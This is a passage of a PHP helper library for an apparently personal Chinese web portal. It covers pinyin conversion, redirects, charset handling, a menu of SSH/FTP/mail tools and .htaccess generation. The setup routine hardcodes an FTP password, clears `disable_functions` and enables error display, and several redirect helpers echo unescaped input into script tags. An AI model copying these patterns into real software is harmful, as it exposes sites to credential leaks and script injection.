                        "|niei|nehn|neng|nee|nian|niang|niao|nee|nin|ning|niyu|norng|nuu|niyv|nuan|niuo|nwo|oh|au|paah|pai|pan|paung|huuo|pei|pen".  
                        "|peng|pee|pyan|piauu|peayae|pinng|ping|por|puu|tchee|tchya|tchiyan|tchyang|tchyao|tchyeh|tchin|ching|tchiyohng|tchyo|tchyuu|tchyuahn|tchyuye|tchyun|ran|raung".  
                        "|rzao|rze|rengn|reungn|riee|rorng|raeo|ruho|rwan|ruie|raen|ruhoruo|sa|sai|san|sang|sao|sae|sen|seng|sah|sahi|sahn|sahng|sao|".  
                        "sehae|sehn|sehng|sshzee|so|su|swa|swyi|swuan|swang|suie|swuun|suo|sszee|song|sso|su|swan|suie|swen|suo|ta|tai|".  
                        "tan|taung|tao|tahe|teung|tee|tiahn|tiyao|tiae|ting|tong|tezo|tuuuu|twan|tuiw|tuun|tuwo|wa|wya|wan|waung|wei|wen|weng|wo|wu".  
                        "|shee|sshyah|shiyan|shiang|shiyao|shiee|xin|xing|shiog|shiyou|shyu|shywan|sshyuyy|shwaen|yah|yan|iang|yaro|ye|yee|yin|ying|yo|iuang|you".  
                        "|yuy|yuan|yure|yun|zah|zai|zahn|zaung|zao|ze|zei|zen|zeng|zhah|zhai|zhan|zhang|zhao|zheh|zhen|zheng|zheey|zhong|".  
                        "zo|zhuu|zhuah|zhwya|zhwarn|zhwang|zhuie|zhuun|zhuo|zeey|zong|zo|zuuu|zuan|zuui|zuun|zuuo";  
        }
        $_DataValue = "-20319|-20317|-20304|-20295|-20292|-20283|-20265|-20257|-20242|-20230|-20051|-20036|-20032|-20026|-20002|-19990".  
                "|-19986|-19982|-19976|-19805|-19784|-19775|-19774|-19763|-19756|-19751|-19746|-19741|-19739|-19728|-19725".  
                "|-19715|-19540|-19531|-19525|-19515|-19500|-19484|-19479|-19467|-19289|-19288|-19281|-19275|-19270|-19263".  
                "|-19261|-19249|-19243|-19242|-19238|-19235|-19227|-19224|-19218|-19212|-19038|-19023|-19018|-19006|-19003".  
                "|-18996|-18977|-18961|-18952|-18783|-18774|-18773|-18763|-18756|-18741|-18735|-18731|-18722|-18710|-18697".  
                "|-18696|-18526|-18518|-18501|-18490|-18478|-18463|-18448|-18447|-18446|-18239|-18237|-18231|-18220|-18211".  
                "|-18201|-18184|-18183|-18181|-18012|-17997|-17988|-17970|-17964|-17961|-17950|-17947|-17931|-17928|-17922".  
                "|-17759|-17752|-17733|-17730|-17721|-17703|-17701|-17697|-17692|-17683|-17676|-17496|-17487|-17482|-17468".  
                "|-17454|-17433|-17427|-17417|-17202|-17185|-16983|-16970|-16942|-16915|-16733|-16708|-16706|-16689|-16664".  
                "|-16657|-16647|-16474|-16470|-16465|-16459|-16452|-16448|-16433|-16429|-16427|-16423|-16419|-16412|-16407".  
                "|-16403|-16401|-16393|-16220|-16216|-16212|-16205|-16202|-16187|-16180|-16171|-16169|-16158|-16155|-15959".  
                "|-15958|-15944|-15933|-15920|-15915|-15903|-15889|-15878|-15707|-15701|-15681|-15667|-15661|-15659|-15652".  
                "|-15640|-15631|-15625|-15454|-15448|-15436|-15435|-15419|-15416|-15408|-15394|-15385|-15377|-15375|-15369".  
                "|-15363|-15362|-15183|-15180|-15165|-15158|-15153|-15150|-15149|-15144|-15143|-15141|-15140|-15139|-15128".  
                "|-15121|-15119|-15117|-15110|-15109|-14941|-14937|-14933|-14930|-14929|-14928|-14926|-14922|-14921|-14914".  
                "|-14908|-14902|-14894|-14889|-14882|-14873|-14871|-14857|-14678|-14674|-14670|-14668|-14663|-14654|-14645".  
                "|-14630|-14594|-14429|-14407|-14399|-14384|-14379|-14368|-14355|-14353|-14345|-14170|-14159|-14151|-14149".  
                "|-14145|-14140|-14137|-14135|-14125|-14123|-14122|-14112|-14109|-14099|-14097|-14094|-14092|-14090|-14087".  
                "|-14083|-13917|-13914|-13910|-13907|-13906|-13905|-13896|-13894|-13878|-13870|-13859|-13847|-13831|-13658".  
                "|-13611|-13601|-13406|-13404|-13400|-13398|-13395|-13391|-13387|-13383|-13367|-13359|-13356|-13343|-13340".  
                "|-13329|-13326|-13318|-13147|-13138|-13120|-13107|-13096|-13095|-13091|-13076|-13068|-13063|-13060|-12888".  
                "|-12875|-12871|-12860|-12858|-12852|-12849|-12838|-12831|-12829|-12812|-12802|-12607|-12597|-12594|-12585".  
                "|-12556|-12359|-12346|-12320|-12300|-12120|-12099|-12089|-12074|-12067|-12058|-12039|-11867|-11861|-11847".  
                "|-11831|-11798|-11781|-11604|-11589|-11536|-11358|-11340|-11339|-11324|-11303|-11097|-11077|-11067|-11055".  
                "|-11052|-11045|-11041|-11038|-11024|-11020|-11019|-11018|-11014|-10838|-10832|-10815|-10800|-10790|-10780".  
                "|-10764|-10587|-10544|-10533|-10519|-10331|-10329|-10328|-10322|-10315|-10309|-10307|-10296|-10281|-10274".  
                "|-10270|-10262|-10260|-10256|-10254";  
        $_TDataKey   = explode('|', $_DataKey);  
        $_TDataValue = explode('|', $_DataValue);  

        $_Data = (php_VERSION>='5.0') ? array_combine($_TDataKey,  $_TDataValue) : _Array_Combine($_TDataKey, $_TDataValue);  
        arsort($_Data);  
        reset($_Data);  

        if($_Code != 'gb2312') $_String = _U2_Utf8_Gb($_String);  
        $_Res = '';  
        $_String = hanpc2enpc($_String);
        for($i=0; $i<strlen($_String); $i++)  
        {  
                $_P = ord(substr($_String, $i, 1));  
                if($_P>160) { $_Q = ord(substr($_String, ++$i, 1)); $_P = $_P*256 + $_Q - 65536; }  
                $_Res .= _Pinyin($_P, $_Data)." ";  
        }  
        if ($_symbol === true){
                return preg_replace("/[^a-z0-9 \:\|\.\,\'\"\?\!]*/", '', $_Res);  
                //return preg_replace("/[^a-z0-9 ]*/", '', $_Res); 
        }       
        else
                return preg_replace("/[^a-z0-9]*/", '', $_Res);  
                
        //return $_Res;  
        exit;
}  

function _Pinyin($_Num, $_Data)  
{  
        if    ($_Num>0      && $_Num<160   ) return chr($_Num);  
        elseif($_Num<-20319 || $_Num>-10247) return '';  
        else  {  
                foreach($_Data as $k=>$v){ if($v<=$_Num) break; }  
                return $k;  
        }  
}  

function _U2_Utf8_Gb($_C)  
{  
        $_String = '';  
        if($_C < 0x80) $_String .= $_C;  
        elseif($_C < 0x800)  
        {  
                $_String .= chr(0xC0 | $_C>>6);  
                $_String .= chr(0x80 | $_C & 0x3F);  
        }elseif($_C < 0x10000){  
                $_String .= chr(0xE0 | $_C>>12);  
                $_String .= chr(0x80 | $_C>>6 & 0x3F);  
                $_String .= chr(0x80 | $_C & 0x3F);  
        } elseif($_C < 0x200000) {  
                $_String .= chr(0xF0 | $_C>>18);  
                $_String .= chr(0x80 | $_C>>12 & 0x3F);  
                $_String .= chr(0x80 | $_C>>6 & 0x3F);  
                $_String .= chr(0x80 | $_C & 0x3F);  
        }  
        return iconv('UTF-8', 'GB2312', $_String);  
}  

function _Array_Combine($_Arr1, $_Arr2)  
{  
        for($i=0; $i<count($_Arr1); $i++) $_Res[$_Arr1[$i]] = $_Arr2[$i];  
        return $_Res;  
} 
?>

<?php 
function checkip($ipstr,$url){
        $IPFilter = new IPFilter($ipstr);
        if (arrmember($IPFilter->CheckIP(),0)==='ok'){
        	return array('1',arrmember($IPFilter->CheckIP(),1));
        }
        else{
        	return array('0',arrmember(split("[.]",arrmember($IPFilter->CheckIP(),1)),0).".".arrmember(split("[.]",arrmember($IPFilter->CheckIP(),1)),1),$url."&ip=".arrmember($IPFilter->CheckIP(),1));
                //redirect($url."&ip=".$IPFilter->CheckIP()); 
                break;
        }       
}

function selstyle($skincolor){
        if ($skincolor == ""){
                $skincolor = split("[|]","red|gold|blue|purple|black|green");
                $skincolor = $skincolor[rand(0,5)];
        }
        
        $style = new css();
        $style->selcss(strtolower(trim($skincolor)));

        return $skincolor;              
}


function deldir($dir,$day,$flag) {
  //先删除目录下的文件：
  $dh=opendir($dir);
  while ($file=readdir($dh)) {
    if($file!="." && $file!=".."){
    	//if(preg_replace($pattern,'$1$2$3',$file)==$file){
    	if((time()-filectime($dir."/".$file))/3600/24 >= $day){    	
      	$fullpath=$dir."/".$file;
      	if(!is_dir($fullpath)) {
          unlink($fullpath);
      	} else {
          deldir($fullpath,$day,'all');
      	}    		
    	}
    }
  }
  closedir($dh);
  
  if($flag=='all'){
  	//删除当前文件夹：
  	if(rmdir($dir)) {
    	return true;
  	} else {
    	return false;
  	}
	}
}

function httppathdir(){

        $Ser = trim($_SERVER["SERVER_NAME"]);
        $Scr = trim($_SERVER["SCRIPT_NAME"]);
        $Port = trim($_SERVER["SERVER_PORT"]);

        $Scr_2 = strrev(substr(strrev($Scr),strpos(strrev($Scr),"/")));

        if(strpos(ini_get('upload_tmp_dir'),'/var/vcap.local/dea/apps/')>=0){
                return "http://".$Ser.$Scr_2;
 				}	
		    elseif(trim($_SERVER["SERVER_PORT"])=="80"){
                return "http://".$Ser.$Scr_2;
        }       
        else{
                return "http://".$Ser.":".trim($_SERVER["SERVER_PORT"]).$Scr_2;
        }

}

Function HttpPath(){

				if(strpos(ini_get('upload_tmp_dir'),'/var/vcap.local/dea/apps/')>=0){
                return "http://".trim($_SERVER["SERVER_NAME"]).ScriptPath();
				}	
		    elseIf (trim($_SERVER["SERVER_PORT"]) == "80")
                return "http://".trim($_SERVER["SERVER_NAME"]).ScriptPath();
        else
                return "http://".trim($_SERVER["SERVER_NAME"]).":".trim($_SERVER["SERVER_PORT"]).ScriptPath();
}

function ScriptPath(){
        return trim($_SERVER["SCRIPT_NAME"]);
}
?>

<?php 
function selskin(){
        $style = new css;
?>
                &nbsp
                <a href="<?php  $style->configrequest($ScriptPath."?".$_SERVER['QUERY_STRING'],"skin","blue")?>" style="color:blue;text-decoration:none;font-size:9px"><?php echo formatchar('◆');?></a>
                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","red")?>" style="color:red;text-decoration:none;font-size:9px"><?php echo formatchar('◆');?></a>
                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","gold")?>" style="color:gold;text-decoration:none;font-size:9px"><?php echo formatchar('◆');?></a>
                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","green")?>" style="color:green;text-decoration:none;font-size:9px"><?php echo formatchar('◆');?></a>
                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","purple")?>" style="color:purple;text-decoration:none;font-size:9px"><?php echo formatchar('◆');?></a>
                <a href="<?php  $style->configrequest(ScriptPath()."?".$_SERVER['QUERY_STRING'],"skin","black")?>" style="color:black;text-decoration:none;font-size:9px"><?php echo formatchar('◆');?></a>

<?php 
}
?>

<?php 
function redirect($url){
        echo "<script>window.location = \"".$url."\" ;</script>";
        //echo "<script>window.setTimeout(\"location.href=\'".$url."\'\",0);</script>";
        exit;
        //echo "<SCRIPT LANGUAGE=\"JavaScript\">";
        //echo "location.href='$url'";      
        //echo "</SCRIPT>";
        //echo "<META HTTP-EQUIV=\"Refresh\" CONTENT=\"0;URL=$url\">";  
}
?>

<?php 
function union_redirect($surl){
	$url = array();
	$url[0] = "";
	$url[1] = "";
	IF(!is_wap())
		redirect($url[rand(0,count($url)-1)]);
	else
		redirect($surl);
}
?>

<?php 
function encodeuri($str){
        $str = urlencode($str);
        $str = str_replace("<", "%3c", $str);
        $str = str_replace(">", "%3E", $str);
        //$str = str_replace("-", "%2D", $str);
        //$str = str_replace("_", "%5F", $str);
        // 以上取消的代码一度将程序卡死，后发现仅有长连接被卡，试用连接编码简化成功
        return $str;
}
function decodeuri($str){
        $str = urldecode($str);
        $str = str_replace("%2E", ".", $str);
        $str = str_replace("%2D", "-", $str);
        $str = str_replace("%5F", "_", $str);
        return $str;
}
?>

<?php 
function geturlinfo($url,$type){
        if ($type == 'ext'){
                $urlstr = parse_url($url);      
                $urlstr = pathinfo($urlstr["path"]);
                return $urlstr["extension"];    
        }
        elseif ($type == 'filename'){
                $urlstr = parse_url($url);      
                $urlstr = pathinfo($urlstr["path"]);
                return $urlstr["basename"];     
        }               
        elseif ($type == 'dirname'){
                $urlstr = parse_url($url);      
                $urlstr = pathinfo($urlstr["path"]);
                return $urlstr["dirname"];      
        }               
}
?>

<?php 
function arrmember($array,$number){
        return $array[$number];
}
?>

<?php 
function arrsignmember($array,$sign){
        return $array[$sign];
}
?>

<?php 
function request($query){
        if ($_GET[$query] != "" && $_POST[$query] == "")
                return $_GET[$query];
        elseif ($_GET[$query] == "" && $_POST[$query] != "")    
                return $_POST[$query];
        elseif ($_GET[$query] == "" && $_POST[$query] == "")    
                return $_POST[$query];

}
?>

<?php 
function GetGB2312String($name)
{
$tostr = "";
for($i=0;$i<strlen($name);$i++)
{
   $curbin = ord(substr($name,$i,1));
   if($curbin < 0x80)
   {
    $tostr .= substr($name,$i,1);
   }elseif($curbin < bindec("11000000")){
    $str = substr($name,$i,1);
    $tostr .= "&#".ord($str).";";
   }elseif($curbin < bindec("11100000")){
    $str = substr($name,$i,2);
    $tostr .= "&#".GetUnicodeChar($str).";";
    $i += 1;
   }elseif($curbin < bindec("11110000")){
    $str = substr($name,$i,3);
    $gstr= iconv("UTF-8","GB2312",$str);
    if(!$gstr)
    {
    $tostr .= "&#".GetUnicodeChar($str).";";
    }else{
    $tostr .= $gstr;
    }

    $i += 2;
   }elseif($curbin < bindec("11111000")){
    $str = substr($name,$i,4);
    $tostr .= "&#".GetUnicodeChar($str).";";
   
    $i += 3;
   }elseif($curbin < bindec("11111100")){
    $str = substr($name,$i,5);
    $tostr .= "&#".GetUnicodeChar($str).";";
   
    $i += 4;
   }else{
    $str = substr($name,$i,6);
    $tostr .= "&#".GetUnicodeChar($str).";";
   
    $i += 5;
   }
}

return $tostr;
}//end function

function GetUnicodeChar($str)
{
$temp = "";
for($i=0;$i<strlen($str);$i++)
{
   $x = decbin(ord(substr($str,$i,1)));
   if($i == 0)
   {
    $s = strlen($str)+1;
    $temp .= substr($x,$s,8-$s);
   }else{
    $temp .= substr($x,2,6);
   }
}
return bindec($temp);
}//end function

?>

<?php 
function sellink($str,$skincolor){
$sellinkstr = split("[|]",$str);
$linkstr = "";
for ($i = 0;$i < count($sellinkstr);$i++){
        switch (trim($sellinkstr[$i])) {
                case "IVR":
                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=ivr&skin=".$skincolor."\">".formatchar('IVR')."</a> ";
                        break;
                case "网盘":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=vdisk&skin=".$skincolor."\">".formatchar('网盘')."</a> ";
                        break;
                case "搜索":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=bing&skin=".$skincolor."\">".formatchar('搜索')."</a> ";
                        break;
                case "图片":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=picture&skin=".$skincolor."\">".formatchar('图片')."</a> ";
                        break;
                case "视频":
                       	$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=tudou&skin=".$skincolor."\">".formatchar('视频')."</a> ";
                        break;
                case "插件":
                        $linkstr = $linkstr . "<a id=\"zonemap\" style=\"\" href=\"?api=setup&skin=".$skincolor."\" target=\"_blank\">".formatchar('插件')."</a> ";
                        break;
                case "工具条":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=ieshow&skin=".$skincolor."\">".formatchar('工具条')."</a> ";
                        break;
                case "地球":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=gmap&skin=".$skincolor."\">".formatchar('地球')."</a> ";
                        break;
                case "读书":
                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=docin&skin=".$skincolor."\">".formatchar('读书')."</a> ";
                        break;
                case "播放":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=player&skin=".$skincolor."\">".formatchar('播放')."</a> ";
                        break;
                case "域名":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=dnspod&skin=".$skincolor."\">".formatchar('域名')."</a> ";
                        break;
                case "主页":
                        $linkstr = $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?skin=".$skincolor."\">".formatchar('主页')."</a> ";
                        break;
                case "首页":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=m&skin=".$skincolor."\">".formatchar('首页')."</a> ";
                        break;                        
                case "PING":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=ping&skin=".$skincolor."\">".formatchar('PING')."</a> ";
                        break;                                               
                case "消息":
                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=imified&skin=".$skincolor."\">".formatchar('消息')."</a> ";
                        break;
                case "编写":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=editor&skin=".$skincolor."\">".formatchar('编写')."</a> ";
                        break;
                case "发信":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=smtp&skin=".$skincolor."\">".formatchar('发信')."</a> ";
                        break;
                case "相册":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=picasa&skin=".$skincolor."\">".formatchar('相册')."</a> ";
                        break;
                case "网址":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=urlshortener&skin=".$skincolor."\">".formatchar('网址')."</a> ";
                        break;
                case "游戏":
                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=idoll&skin=".$skincolor."\">".formatchar('游戏')."</a> ";
                        break;
                case "聊天":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=gtalk&skin=".$skincolor."\">".formatchar('聊天')."</a> ";
                        break;
                case "FTP":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=ftp&skin=".$skincolor."\">".formatchar('FTP')."</a> ";
                        break;
                case "邮件":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=imap&skin=".$skincolor."\">".formatchar('邮件')."</a> ";
                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=byban&skin=".$skincolor."\">".formatchar('邮件')."</a> ";
                        break;
                case "邮箱":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=live&skin=".$skincolor."\">".formatchar('邮箱')."</a> ";
                        break;
                case "计划":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=zoho&action=planner&skin=".$skincolor."\">".formatchar('计划')."</a> ";
                        break;
                case "会议":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=stickam&skin=".$skincolor."\">".formatchar('会议')."</a> ";
                        break;
                case "阅览":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=zoho&action=viewer&skin=".$skincolor."\">".formatchar('阅览')."</a> ";
                        break;
                case "股票":
                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=10jqka&action=stock&skin=".$skincolor."\">".formatchar('股票')."</a> ";
                        break;
                case "VPN":
                        //$linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=vpn&skin=".$skincolor."\">".formatchar('VPN')."</a> ";
                        break;
                case "SSH":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=ssh&skin=".$skincolor."\">".formatchar('SSH')."</a> ";
                        break;
                case "主机":
                        $linkstr = $linkstr . "<a style=\"\" href=\"".ScriptPath()."?api=cloudhost&skin=".$skincolor."\">".formatchar('主机')."</a> ";
                        break;
        }
}
echo ($linkstr)."&nbsp;";
}
?>

<?php 
function formatchar($str,$code=null){
	$codebase = strtolower(($code!=null) ? $code : getcharset());
	if ($codebase != 'gb2312' && $codebase != 'gbk')
		return iconv('gb2312',$codebase,$str);
	ELSE	
		return $str;
}

?>

<?php 
function is_wap(){
    $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
    //$uachar = "/(nokia|sony|ericsson|mot|samsung|sgh|lg|sie|philips|panasonic|alcatel|lenovo|cldc|midp|wap|mobile)/i";
    $uachar = "/(nokia|sony|ericsson|mot|samsung|sgh|lg|philips|panasonic|alcatel|lenovo|cldc|midp|wap|mobile|ucweb)/i";
    //if(($ua == '' || preg_match($uachar, $ua)) && !strpos(strtolower($_SERVER['REQUEST_URI']),'wap')){//如果在访问的URL中已经找到 wap字样，表明已经在访问WAP页面，无需跳转，下一版本增加 feed访问时也不跳转
    if(($ua == '' || preg_match($uachar, $ua))){//如果在访问的URL中已经找到 wap字样，表明已经在访问WAP页面，无需跳转，下一版本增加 feed访问时也不跳转
        return true;
    }else{
        return false;
    }
}

/**
 * $str 原始字符串
 * $encoding 原始字符串的编码，默认GBK
 * $prefix 编码后的前缀，默认"&#"
 * $postfix 编码后的后缀，默认";"
 */
function unicode_encode($str, $encoding = 'GBK', $prefix = '&#', $postfix = ';') {
    $str = iconv($encoding, 'UCS-2', $str);
    $arrstr = str_split($str, 2);
    $unistr = '';
    for($i = 0, $len = count($arrstr); $i < $len; $i++) {
        $dec = hexdec(bin2hex($arrstr[$i]));
        $unistr .= $prefix . $dec . $postfix;
    } 
    return $unistr;
} 
 
/**
 * $str Unicode编码后的字符串
 * $encoding 原始字符串的编码，默认GBK
 * $prefix 编码字符串的前缀，默认"&#"
 * $postfix 编码字符串的后缀，默认";"
 */
function unicode_decode($unistr, $encoding = 'GBK', $prefix = '&#', $postfix = ';') {
    $arruni = explode($prefix, $unistr);
    $unistr = '';
    for($i = 1, $len = count($arruni); $i < $len; $i++) {
        if (strlen($postfix) > 0) {
            $arruni[$i] = substr($arruni[$i], 0, strlen($arruni[$i]) - strlen($postfix));
        } 
        $temp = intval($arruni[$i]);
        $unistr .= ($temp < 256) ? chr(0) . chr($temp) : chr($temp / 256) . chr($temp % 256);
    } 
    return iconv('UCS-2', $encoding, $unistr);
} 

?>

<?php 
function htaccess(){
switch (trim(request('action'))) { //action switch start
        case 'wap':
?>
# Rename this file to .htaccess if you want to allow large file uploads
# Note that this file is not always taken into account, depending on your server configuration

<IfModule mod_rewrite.c>

RewriteEngine On
RewriteBase /

#只许绑定的域名访问

RewriteCond %{HTTP_HOST} !^m.x3193.cf$ [NC]
RewriteRule (.*) http://m.x3193.cf/$1 [L,R=301]

#对绑定目录下与 同名的目录的处理

RewriteCond %{REQUEST_URI} ^/m/ [NC]
RewriteCond %{QUERY_STRING} !^(.*)?Rewrite
RewriteRule ^(.*)$ /%{REQUEST_URI}/%{REQUEST_URI}/$1?Rewrite [L,QSA]

</IfModule>

php_value max_execution_time 1200
php_value memory_limit 500M
php_value post_max_size 500M
php_value upload_max_filesize 500M
php_flag enable_dl On
php_flag apc.rfc1867 On
php_value error_reporting 0
php_flag session.use_cookies On
php_value session.cookie_lifetime 999999999
php_value session.gc_maxlifetime 999999999
<?php         
        		break;
        default:	
?>
# Rename this file to .htaccess if you want to allow large file uploads
# Note that this file is not always taken into account, depending on your server configuration

<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /

# 绑定m.x3193.cf 到 m 子目录
RewriteCond %{HTTP_HOST} ^m.x3193.cf$ [NC]
RewriteCond %{REQUEST_URI} !^/m/
RewriteRule ^(.*)$ m/$1?Rewrite [L,QSA]

#可以绑定多个 只需重复上三行代码并更改一下域名、目录名 就好了

# 绑定m.blog.x3193.cf 到 m/wap 子目录
RewriteCond %{HTTP_HOST} ^m.blog.x3193.cf$ [NC]
RewriteCond %{REQUEST_URI} !^/m/wap/
RewriteRule ^(.*)$ m/wap/$1?Rewrite [L,QSA]

</IfModule>

php_value max_execution_time 1200
php_value memory_limit 500M
php_value post_max_size 500M
php_value upload_max_filesize 500M
php_flag enable_dl On
php_flag apc.rfc1867 On
php_value error_reporting 0
php_flag session.use_cookies On
php_value session.cookie_lifetime 999999999
php_value session.gc_maxlifetime 999999999
<?php 
	}
}
?>

<?php 
function syssetini(){
header("cache-control:no-cache,must-revalidate");

ini_set("max_execution_time","77777");  
ini_set("memory_limit","7777M"); 
ini_set("max_input_time","77777");      
ini_set("max_file_uploads","7777");     
ini_set("post_max_size","500M");        
ini_set("upload_max_filesize","500M");  
//ini_set("enable_dl","1");       
ini_set("display_errors","On");       
ini_set("display_startup_errors","On");       
ini_set("track_errors","On");       
ini_set("extension_dir","7");   
//ini_set("upload_tmp_dir","7");  
//ini_set("output_buffering","4096");     
ini_set("sendmail_from","xcy6272003@163.com");  
ini_set("SMTP","smtp.163.com");         
ini_set("smtp_port","25");      
ini_set("disable_functions","");        
//ini_set("extension_dir","/home/x3193/php/ext"); 
ini_set("error_reporting","E_ALL & E_STRICT");
ini_set("session.use_cookies","1");
ini_set("session.cookie_lifetime","999999999");
ini_set("session.gc_maxlifetime","999999999");
//ini_set("apc.rfc1867","1");
//error_reporting(E_ALL);
ini_set('display_startup_errors', 1);
ini_set('display_errors', 1);

	session_start(); // 启动Session 
	if(isset($_COOKIE[session_name()])) { 
   session_id($_COOKIE[session_name()]); 
	} 
	setcookie(session_name(),session_id(),time()+3600*24*30.5);

if (0){
                $ftpserver = trim($_SERVER['SERVER_NAME']);
                $ftpuname = "x3193";
                $ftppwd = "EUIfgwe7";   
                $ftpport = '21';
                $ftpssl = "0";
                $ftppasv = "1"; 
                $ftpfile = './X3193/index.php'; 
                $ftpdir = './X3193/record';     
                $ftptmpdir = './X3193/tmp';     
                $ftpflag = '0'; 
                $redirecturl = ScriptPath().'?api=blank';    
}
else{
       
                //$ftpfile = './public_html/'.trim($_SERVER['SERVER_NAME']).'/index.php';   
                //$ftpdir = './public_html/'.trim($_SERVER['SERVER_NAME']).'/record';       
                //$ftptmpdir = './public_html/'.trim($_SERVER['SERVER_NAME']).'/tmp';  
                     
                //$ftpfile = '.'.getcwd().'/index.php';   
                //$ftpdir = '.'.getcwd().'/record';       
                //$ftptmpdir = '.'.getcwd().'/tmp'; 
                
                //$ftpfile = './public_html/index.php';   
                //$ftpdir = './public_html/record';       
                //$ftptmpdir = './public_html/tmp';                 
                $ftpflag = '1'; 
                $redirecturl = ScriptPath().'?api=verify'; 
                
                $ftpserver = trim($_SERVER['SERVER_NAME']);
                $ftpuname = preg_replace("/(\/home\/|\/home\/ftp\/x\/)([^\/]+)(\/public_html|\/wwwroot)/", "$2", getcwd());
                $ftpfile = '.'.preg_replace("/(\/home\/|\/home\/ftp\/x\/)([^\/]+)(\/public_html|\/wwwroot)/", "$3", getcwd()).'/index.php';  
                $ftpdir = '.'.preg_replace("/(\/home\/|\/home\/ftp\/x\/)([^\/]+)(\/public_html|\/wwwroot)/", "$3", getcwd()).'/record';       
                $ftptmpdir = '.'.preg_replace("/(\/home\/|\/home\/ftp\/x\/)([^\/]+)(\/public_html|\/wwwroot)/", "$3", getcwd()).'/tmp';                 
                $ftppwd = "EUIfgwe7";
                $ftpport = '21';                
                $ftpssl = "0";
                $ftppasv = "1";  
                                 
                //echo getcwd().$ftpuname;
}

if (substr(sprintf('%o', fileperms('./index.php')), -4)!='0755'){
        if($ftpflag == '1'){
        	if (function_exists(chmod))
      		{
      			chmod("./index.php", 0755);     			
      		}        	
       	
        } 
}

//return $redirecturl;
//exit;


$dirlist = array('./record','./tmp','./m','./verifylist');
for($i=0;$i<=count($dirlist)-1;$i++){
if (!file_exists($dirlist[$i])){
        if($ftpflag == '1'){
      		if (function_exists(mkdir))
      		{
      			mkdir($dirlist[$i], 0755, true);      			
      		}        	
      	
        }
              
}       
if (substr(sprintf('%o', fileperms($dirlist[$i])), -4)!='0755'){
        if($ftpflag == '1'){
        	if (function_exists(chmod))
      		{
      			chmod($dirlist[$i], 0755);      			
      		}        	
       	
        }               
}
}

if(ini_get('post_max_size')!='500M' && ini_get('upload_max_filesize')!='500M'){
        		if(!file_exists('./.htaccess')){
                touch ('./.htaccess');        			
                $handle = fopen('./.htaccess', 'w+');                
                rewind ($handle);
                $ch = curl_init();
                $url = httppath()."?api=htaccess";
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                //curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5000);
                $string = curl_exec($ch);
                //echo $string;
                curl_close($ch);
                fwrite($handle, $string);
                fclose ($handle);
						}
        		if(!file_exists('./m/.htaccess')){
                touch ('./m/.htaccess');        			
                $handle = fopen('./m/.htaccess', 'w+');                
                rewind ($handle);
                $ch = curl_init();
                $url = httppath()."?api=htaccess&action=wap";
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                //curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5000);
                $string = curl_exec($ch);
                //echo $string;
                curl_close($ch);
                fwrite($handle, $string);
                fclose ($handle);
						}						
}

return $redirecturl;
}
?>

<?php 
Function AlertBack($AlertStr,$BackNum){
  echo "<script>"; 
  echo "alert('".$AlertStr."');"; 
  echo "history.go(-".$BackNum.")"; 
  echo "</script>"; 
  exit;
}
?>

<?php 
Function GoBack($BackNum){
  echo "<script>"; 
  echo "history.go(-".$BackNum.")"; 
  echo "</script>"; 
  exit;
}
?>

<?php 
Function redirectBack($AlertStr,$BackNum){
  echo "<script>"; 
  echo "history.go(-".$BackNum.")"; 
  echo "</script>"; 
  exit;
}
?>

<?php 
function getcharset(){
        if (trim(getheadcharset())!=''){   
								return getheadcharset();
        }
        elseif (trim($_SERVER['HTTP_ACCEPT_CHARSET'])!=''){
